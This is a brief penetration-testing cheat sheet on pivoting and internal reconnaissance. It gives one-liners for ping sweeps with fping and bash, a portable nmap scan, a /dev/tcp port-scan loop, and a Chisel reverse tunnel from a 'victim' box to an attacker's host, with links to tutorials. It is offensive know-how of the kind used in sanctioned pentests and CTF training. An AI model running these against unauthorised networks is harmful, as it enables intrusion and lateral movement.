### [Resources on pivoting]

https://www.offensive-security.com/metasploit-unleashed/pivoting/  

### [fping]

You can use fping to quickly ping hosts within a network.

https://fping.org/

https://fping.org/dist/

```
fping -q -a -g -r 1 <IP>/24
```

### ping sweep (example provided by John Hammond)

https://youtu.be/pbR_BNSOaMk

```
for i in $(seq 254); do ping 10.1.2.$i -c1 -cW1 & done | grep from
```

### [Portable NMAP Scanner]

You can scan and enumerate ports on a list of ports.

```
./nmap -iL ip_list.txt --min-rate=6000
```

https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap  

### [Port Forwarding using Chisel]

ippsec demonstration

https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1620&ab_channel=IppSec

Breakdown

https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html

```
Victims Box: ./chisel client <attackersIP>:8011 R:1234:127.0.0.1:1234
Attackers Box: ./chisel server -p 8011 --reverse
```

### port checking (thanks to @TheCyberGeek)

```
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/<IP>/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```
